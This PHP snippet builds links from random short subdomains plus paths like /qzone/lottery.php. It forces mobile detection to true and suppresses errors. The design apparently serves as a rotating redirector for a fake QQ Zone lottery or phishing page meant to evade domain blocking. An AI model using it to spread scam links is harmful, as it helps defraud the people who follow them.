<?php
  error_reporting(0);
  
  function getDomain($t){
    if (!isset($_SERVER['HTTP_HOST']) || stristr($_SERVER['HTTP_HOST'],'localhost')) {
      $url = 'www.5v1.com';
    }else{
      $url = $_SERVER['HTTP_HOST'];
    }
    $_url = explode(".", $url);

    $query = $_SERVER['QUERY_STRING'];
    //return $url.'/qzone/lottery.php?'.$query;

    $domain = array_pop($_url);
    $domain = array_pop($_url).'.'.$domain;

    $str = '0123456789abcdefghijklmnopqrstuvwxyz';

    $areaTimes = rand(1,1);
    $area = '';

    for ($j=0; $j < $areaTimes; $j++) { 
      $len = rand(1,3);
      for ($i=0; $i < $len; $i++) { 
        $rand = rand(0,(strlen($str)-1));
        $area .= substr($str,$rand,1);
      }
      $area .= '.';
    }
	if($t == 1){
		$domain = $area.$domain.'/qzone/lottery.php?'.$query;
	}else{
		$domain = $area.$domain.'/qzone/index.php?'.$query;
	}
    

    return $domain;
  }
  
    function is_mobile(){
		return true;
	     //正则表达式,批配不同手机浏览器UA关键词。
	     $regex_match="/(nokia|iphone|android|motorola|^mot\-|softbank|foma|docomo|kddi|up\.browser|up\.link|";

	     $regex_match.="htc|dopod|blazer|netfront|helio|hosin|huawei|novarra|CoolPad|webos|techfaith|palmsource|";

	     $regex_match.="blackberry|alcatel|amoi|ktouch|nexian|samsung|^sam\-|s[cg]h|^lge|ericsson|philips|sagem|wellcom|bunjalloo|maui|";

	     $regex_match.="symbian|smartphone|midp|wap|phone|windows ce|iemobile|^spice|^bird|^zte\-|longcos|pantech|gionee|^sie\-|portalmmm|";

	     $regex_match.="jig\s browser|hiptop|^ucweb|^benq|haier|^lct|opera\s*mobi|opera\*mini|320x320|240x320|176x220";

	     $regex_match.=")/i";

	     return isset($_SERVER['HTTP_X_WAP_PROFILE']) or isset($_SERVER['HTTP_PROFILE']) or preg_match($regex_match, strtolower($_SERVER['HTTP_USER_AGENT'])); //如果UA中存在上面的关键词则返回真。

}